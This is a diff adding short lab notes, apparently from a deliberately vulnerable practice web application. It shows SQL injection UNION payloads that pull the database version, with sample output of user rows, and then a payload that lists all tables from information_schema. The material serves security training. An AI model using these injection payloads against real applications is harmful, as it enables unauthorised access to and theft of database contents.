@@ -1,0 +1,35 @@
+To retrieve the database versione use the following command:
+
+%' or 0=0 union select null, version() #
+
+#OUTPUT:
+	ID: %' or '0'='0
+	First name: admin
+	Surname: admin
+
+	ID: %' or '0'='0
+	First name: Gordon
+	Surname: Brown
+
+	ID: %' or '0'='0
+	First name: Hack
+	Surname: Me
+
+	ID: %' or '0'='0
+	First name: Pablo
+	Surname: Picasso
+
+	ID: %' or '0'='0
+	First name: Bob
+	Surname: Smith
+
+	ID: %' or '0'='0
+	First name:
+	Surname: 5.0.51a-3ubuntu5
+
+In the very last result we can see the version of the database
+
+To retrieve all the tables in the database type:
+
+%' and 1=0 union select null, table_name from information_schema.tables #
+
